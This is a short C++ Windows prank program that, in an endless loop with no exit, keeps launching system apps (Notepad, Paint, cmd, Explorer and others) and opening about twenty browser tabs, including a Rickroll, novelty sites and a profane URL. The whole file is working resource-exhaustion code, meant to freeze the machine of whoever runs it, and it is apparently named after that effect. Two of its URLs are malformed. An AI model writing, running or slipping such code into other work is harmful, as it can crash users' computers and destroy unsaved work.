#include <iostream>
#include <windows.h>

int main()
{

    bool running = true;



    while (running)
    {
        //Let's open some apps!
        system("start notepad.exe");
        system("start wordpad.exe");
        system("start msedge.exe");
        system("start mspaint.exe");
        system("start cmd.exe");
        system("start explorer.exe");

        //Let's open some web tabs.
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://https://github.com/OmnisCorp/CPU-RAM_EQUALS_NOT-HAPPY", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://gmail.com", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://reddit.com", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://adarkroom.doublespeakgames.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://https://outlook.live.com", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://theuselessweb.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://www.anothersadtrombone.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://www.gizoogle.net/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://web.archive.org/web/20180201230730/http://www.dragomirsdiary.com/2011/08/hello-diary.html", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://www.daylightofdarkness.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://internet-map.net/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://garfieldminusgarfield.net/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://www.psyhigh.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"https://www.theflatearthsociety.org/home/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://thefuckingtime.com/", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://www.madsci.org/cgi-bin/lynn/jardin/SCG", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://conceptlab.com/simulator/morning/clock800.html", 0, 0, SW_SHOW);
        ShellExecute(0, 0, L"http://burymewithmymoney.com/", 0, 0, SW_SHOW);
    }


    return 0;
}